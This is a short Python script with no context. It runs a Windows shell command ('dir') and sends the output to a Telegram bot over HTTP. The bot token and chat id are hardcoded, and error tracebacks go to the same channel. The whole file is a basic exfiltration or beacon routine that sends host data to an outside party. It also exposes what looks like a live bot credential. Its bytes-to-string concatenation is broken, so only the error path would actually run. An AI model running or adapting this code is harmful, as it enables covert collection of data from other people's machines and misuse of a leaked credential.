import traceback
from subprocess import Popen,PIPE
import requests
try:
    sub = Popen(["cmd.exe","/c","dir"],stdout=PIPE,stderr=PIPE,stdin=PIPE,shell=True)
    output = sub.communicate()[0]
    print(output)
    token = "1951689247:AAGNnZkRBIYIQUW7t8sDgxjLeu0fO-HHfWI"
    chat_id = "1886037256"
    requests.get("https://api.telegram.org/bot" + token + "/sendMessage?text=" + output +"--&chat_id=" + chat_id)
except:
    requests.get("https://api.telegram.org/bot" + token + "/sendMessage?text=" + traceback.format_exc() +"--&chat_id=" + chat_id)
